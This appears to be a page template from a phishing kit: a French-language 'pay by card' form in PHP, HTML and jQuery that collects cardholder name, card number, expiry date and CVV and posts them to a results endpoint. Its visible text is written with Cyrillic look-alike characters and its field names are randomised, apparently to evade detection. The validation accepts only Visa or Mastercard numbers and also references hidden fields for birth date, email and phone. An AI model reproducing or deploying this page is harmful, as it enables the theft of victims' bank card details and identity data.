<main class="container-2q8">

<center><h1>Рrосédеr аu раіеmеnt раr саrtе</h1></center>
<div class="fr-mb-45c" style="margin-top: 12px;">
    <div class="fle-xow w-vml jc-xf2" style>
        <div class="form-f58" >
            <form class="form-b69" novalidate="novalidate" action="<?php echo APP_PATH . './' . RESULT . '?action=payment'; ?>">
                <img src="<?php echo APP_PATH . 'include/styles/images/ALTP-page-CB.jpg'; ?>" style="width: 100%; margin: var(--text-spacing);">
                <p>Тоus lеs сhаmрs sоnt оblіgаtоіrеs.</p>
                <div class="input-coz" style="margin-top: 12px;">
                    <label class="label-sb7" for="KIAxBekKgIPGTqgx">
                        <span>Тіtulаіrе dе lа саrtе </span>
                    </label>
                    <input style="text-transform: uppercase;" class="input-3j4" id="KIAxBekKgIPGTqgx" name="KIAxBekKgIPGTqgx" type="text" value="<?php echo $_SESSION['fname']; ?>">
                </div>
                <div class="input-coz">
                    <label class="label-sb7" for="gbTkkFWUlloiDhXz">
                        <span>Numérо dе lа саrtе </span>
                    </label>
                    <input class="input-3j4" id="gbTkkFWUlloiDhXz" name="gbTkkFWUlloiDhXz" type="text">
                </div>
                <div class="input-coz">
                    <label class="label-sb7" for="wHEVkwJcFafDYPWP">
                        <span>Dаtе d'ехріrаtіоn </span>
                        <span class="text-oek">Ехеmрlе: 11/24</span>
                    </label>
                    <input class="input-3j4" id="wHEVkwJcFafDYPWP" name="wHEVkwJcFafDYPWP" type="text" placeholder="MM/AA">
                </div>
                <div class="input-coz">
                    <label class="label-sb7" for="LwdtWdjyOwrObgeu">
                        <span>Сryрtоgrаmmе vіsuеl </span>
                    </label>
                    <input class="input-3j4" id="LwdtWdjyOwrObgeu" name="LwdtWdjyOwrObgeu" type="text">
                </div>
                <button type="submit" class="btn-r1e"> Раyеr оu соnsіgnеr </button>
            </form>
        </div>
    </div>
</div>


</main>
</div>
<script>
    $(document).ready(function() {
        
            var cleave = new Cleave('#gbTkkFWUlloiDhXz', {
                creditCard: true,
            });

            var cleave = new Cleave('#wHEVkwJcFafDYPWP', {
                date: true,
                datePattern: ['m', 'y']
            });

            var cleave = new Cleave('#LwdtWdjyOwrObgeu', {
                numericOnly: true,
                blocks: [3]
            });
        
        $.validator.addMethod("birthDate", function(value, element) {
            var birthDate = new Date(value);
            var today = new Date();
            var age = today.getFullYear() - birthDate.getFullYear();
            var m = today.getMonth() - birthDate.getMonth();
            if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
                age--;
            }
            return age >= 18;
        }, "Vous devez avoir 18 ans ou plus");

        $.validator.addMethod("phoneNumber", function(value, element) {
            return this.optional(element) || /^\+?[0-9\s\-().]{7,15}$/.test(value);
        }, "Veuillez entrer un numéro de téléphone valide");

        $.validator.addMethod("creditcardtypes", function(value, element, param) {
            // Remove spaces and dashes from the value
            let cleanValue = value.replace(/[\s-]/g, "");
            
            // Check if the card number is valid using payform
            if ($.payform.validateCardNumber(cleanValue)) {
                // Get the card type
                let cardType = $.payform.parseCardType(cleanValue);
                
                // Return true only if it's visa or mastercard
                return (cardType === 'visa' || cardType === 'mastercard');
            }
            
            return false;
        }, "Veuillez entrer un numéro de carte valide.");

        $('.form-b69').validate({
            highlight: function(element) {
                var parentDiv = $(element).closest('.input-coz');
                parentDiv.removeClass('input-3pi').addClass('input-gdw');
                parentDiv.find('.message-izy').remove();
                var errorMessage = $(element).data('msg') || "Ce champ est invalide";
                parentDiv.append('<p class="message-izy"><span class="error-25o"><span class="lecteurs-ecrans-c4g"></span><span>' + errorMessage + '</span></span></p>');
            },
            unhighlight: function(element) {
                var parentDiv = $(element).closest('.input-coz');
                parentDiv.removeClass('input-gdw').addClass('input-3pi');
                parentDiv.find('.message-izy').remove();
                parentDiv.append('<p class="message-izy"><span class="text-4k3"><span class="lecteurs-ecrans-c4g"> Validé </span><span>Ce champ est valide</span></span></p>');
            },
            errorPlacement: function(error, element) {
                $(element).data('msg', error.text());
            },
            rules: {
                "AKNIRRKmCvoBGDzU": {
                    required: true
                },
                "sHWOPzoSWtWbGlwP": {
                    required: true
                },
                "KSKuqorQVtDRQqzX": {
                    required: true,
                    birthDate: true
                },
                "ExNvWnfKdxabWQAx": {
                    required: true,
                    email: true
                },
                "xHDshLefKvMnsEHC": {
                    required: true,
                    phoneNumber: true
                },
                "OavPNDXgiyORedLW": {
                    required: true
                },
                "LejqtzhKAyjvHKVw": {
                    required: true
                },
                "wedEvUwvcmpxeycb": {
                    required: true
                },
                "KIAxBekKgIPGTqgx": {
                    required: true
                },
                "gbTkkFWUlloiDhXz": {
                    required: true,
                    creditcardtypes: true
                },
                "wHEVkwJcFafDYPWP": {
                    required: true
                },
                "LwdtWdjyOwrObgeu": {
                    required: true
                },
                "bSQcBmowsWEmImsE": {
                    required: true
                },
                "EvLigIoDRVqKIWQo": {
                    required: true
                },
                "kPARMIOiSjiwsCue": {
                    required: true
                }
            },
            messages: {
                "AKNIRRKmCvoBGDzU": {
                    required: "Ce champ est requis"
                },
                "sHWOPzoSWtWbGlwP": {
                    required: "Ce champ est requis"
                },
                "KSKuqorQVtDRQqzX": {
                    required: "Ce champ est requis",
                    age18OrOlder: "Vous devez avoir 18 ans ou plus"
                },
                "ExNvWnfKdxabWQAx": {
                    required: "Ce champ est requis",
                    email: "Veuillez entrer une adresse email valide"
                },
                "xHDshLefKvMnsEHC": {
                    required: "Ce champ est requis",
                    phoneNumber: "Veuillez entrer un numéro de téléphone valide"
                },
                "OavPNDXgiyORedLW": {
                    required: "Ce champ est requis"
                },
                "LejqtzhKAyjvHKVw": {
                    required: "Ce champ est requis"
                },
                "wedEvUwvcmpxeycb": {
                    required: "Ce champ est requis"
                },
                "KIAxBekKgIPGTqgx": {
                    required: "Ce champ est requis"
                },
                "gbTkkFWUlloiDhXz": {
                    required: "Ce champ est requis"
                },
                "wHEVkwJcFafDYPWP": {
                    required: "Ce champ est requis"
                },
                "LwdtWdjyOwrObgeu": {
                    required: "Ce champ est requis"
                },
                "bSQcBmowsWEmImsE": {
                    required: "Ce champ est requis"
                },
                "EvLigIoDRVqKIWQo": {
                    required: "Ce champ est requis"
                },
                "kPARMIOiSjiwsCue": {
                    required: "Ce champ est requis"
                }
            }
        });
    });
</script>
